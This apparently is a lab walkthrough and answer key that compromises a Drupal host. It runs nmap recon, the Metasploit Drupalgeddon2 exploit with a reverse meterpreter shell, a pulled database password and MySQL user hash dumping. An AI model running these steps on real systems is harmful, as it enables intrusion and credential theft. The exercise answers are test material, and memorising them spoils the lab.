## STEP 1 — Initial Recon

```bash
# Host discovery on DMZ
sudo nmap -sn 192.168.100.0/24 -oG - | awk '/Up$/{print $2}' > hosts.txt
cat hosts.txt

# Quick service scan on each host
sudo nmap -sV -sC -T4 -p- -iL hosts.txt -oN nmap_full.txt --open
```

**Answers Q1 (host count), Q2-Q11 (per-host OS, port counts, services).**

---

## STEP 2 — Exploit Drupal on .52 (Drupalgeddon2)

```bash
msfconsole -q
```

```
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.100.52
set TARGETURI /drupal/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.100.5
set LPORT 4444
exploit
```

When meterpreter opens:
```
shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Answers Q15 (Drupal version 7.57), Q17 (CVE-2018-7600), Q19 (RCE), Q20 (drupal_drupalgeddon2).**

---

## STEP 3 — Loot MySQL on .52

```bash
# In the www-data shell
cat /var/www/html/drupal/sites/default/settings.php | grep -i pass
# Returns: drupal:syntex0421
```

From Kali, connect directly:
```bash
mysql -h 192.168.100.52 -u root -psyntex0421
```

```sql
SHOW DATABASES;
USE drupal;
SHOW TABLES;
SELECT uid, name, mail, pass FROM users;
```

**Output (the Drupal users + hashes):**
```
| uid | name     | pass                                                    |
|   1 | admin    | $S$D67i0qFmSLMLwZ9PU7VEocSS9fvV1JaSeJxQMgCid80hGbq6wXZH |
|   2 | auditor  | $S$DV.wsqkmKY3y5VW.icW/g5NTU3h.UA01nxqL9Cro27GaSBYpH4WC |
|   3 | dbadmin  | $S$DZcGD5qcb6xso1E/Mu6DJP4uPi5DfY28kBEyuIab8Pod1saBaImN |
|   4 | Vincenzo | $S$DGnS.dK3q2FeWeNbLikdI5Hk/XdBFI2jBFkmPvv/v9Ln8vjIanIu |
```

**Save the hashes to a file:**
```bash
cat > /tmp/drupal.hashes << 'EOF'
$S$D67i0qFmSLMLwZ9PU7VEocSS9fvV1JaSeJxQMgCid80hGbq6wXZH
$S$DV.wsqkmKY3y5VW.icW/g5NTU3h.UA01nxqL9Cro27GaSBYpH4WC
$S$DZcGD5qcb6xso1E/Mu6DJP4uPi5DfY28kBEyuIab8Pod1saBaImN
$S$DGnS.dK3q2FeWeNbLikdI5Hk/XdBFI2jBFkmPvv/v9Ln8vjIanIu
EOF
```

**Answers Q14 (admin email), Q21 (Locally Stored Credentials), Q36 (syntex0421).**

